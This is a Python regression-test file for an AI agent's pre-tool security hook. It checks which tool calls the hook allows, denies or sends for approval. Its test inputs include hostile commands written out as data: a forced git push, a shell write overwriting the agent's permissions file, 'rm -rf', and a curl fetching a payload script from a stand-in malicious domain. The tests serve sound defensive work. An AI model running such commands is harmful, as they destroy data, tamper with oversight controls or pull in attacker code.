"""Regression tests for the Antigravity pre-tool security hook."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path


HOOK = (
    Path(__file__).resolve().parents[2]
    / ".agent"
    / "harness"
    / "hooks"
    / "antigravity_pre_tool.py"
)


def _run_hook(payload: str) -> dict[str, str]:
    process = subprocess.run(
        [sys.executable, str(HOOK)],
        input=payload,
        capture_output=True,
        text=True,
        check=True,
    )
    return json.loads(process.stdout)


def test_pre_tool_hook_denies_malformed_json() -> None:
    result = _run_hook("{")

    assert result["decision"] == "deny"
    assert "error" in result["reason"].lower()


def test_pre_tool_hook_denies_missing_tool_call() -> None:
    result = _run_hook(json.dumps({}))

    assert result["decision"] == "deny"
    assert "toolcall" in result["reason"].lower()


def test_pre_tool_hook_denies_payload_with_invalid_tool_call_shape() -> None:
    result = _run_hook(json.dumps({"toolCall": "not-an-object"}))

    assert result["decision"] == "deny"
    assert "error" in result["reason"].lower()


def test_pre_tool_hook_denies_force_push() -> None:
    result = _run_hook(
        json.dumps({
            "toolCall": {
                "name": "bash",
                "args": {"command": "git -C . push --force origin main"},
            }
        })
    )

    assert result["decision"] == "deny"
    assert "forbidden" in result["reason"].lower()


def test_pre_tool_hook_denies_permissions_file_modification_via_shell() -> None:
    result = _run_hook(
        json.dumps({
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "echo 'hack' > .agent/protocols/permissions.md"},
            }
        })
    )

    assert result["decision"] == "deny"
    assert "permissions" in result["reason"].lower()


def test_pre_tool_hook_denies_permissions_file_modification_via_write_tool() -> None:
    result = _run_hook(
        json.dumps({
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": ".agent/protocols/permissions.md"},
            }
        })
    )

    assert result["decision"] == "deny"
    assert "permissions" in result["reason"].lower()


def test_pre_tool_hook_requires_approval_for_destructive_deletion() -> None:
    result = _run_hook(
        json.dumps({
            "toolCall": {
                "name": "bash",
                "args": {"command": "rm -rf ./build"},
            }
        })
    )

    assert result["decision"] == "ask"


def test_pre_tool_hook_requires_approval_for_migrations() -> None:
    result = _run_hook(
        json.dumps({
            "toolCall": {
                "name": "run_command",
                "args": {"command": "make migrate"},
            }
        })
    )

    assert result["decision"] == "ask"


def test_pre_tool_hook_requires_approval_for_package_install() -> None:
    result = _run_hook(
        json.dumps({
            "toolCall": {
                "name": "bash",
                "args": {"command": "pip install requests"},
            }
        })
    )

    assert result["decision"] == "ask"


def test_pre_tool_hook_denies_unapproved_external_domain() -> None:
    result = _run_hook(
        json.dumps({
            "toolCall": {
                "name": "bash",
                "args": {"command": "curl https://malicious-site.example.com/payload.sh"},
            }
        })
    )

    assert result["decision"] == "deny"
    assert "not in approved list" in result["reason"].lower()


def test_pre_tool_hook_allows_safe_command() -> None:
    result = _run_hook(
        json.dumps({
            "toolCall": {
                "name": "run_command",
                "args": {"command": "pytest tests/ci"},
            }
        })
    )

    assert result["decision"] == "allow"
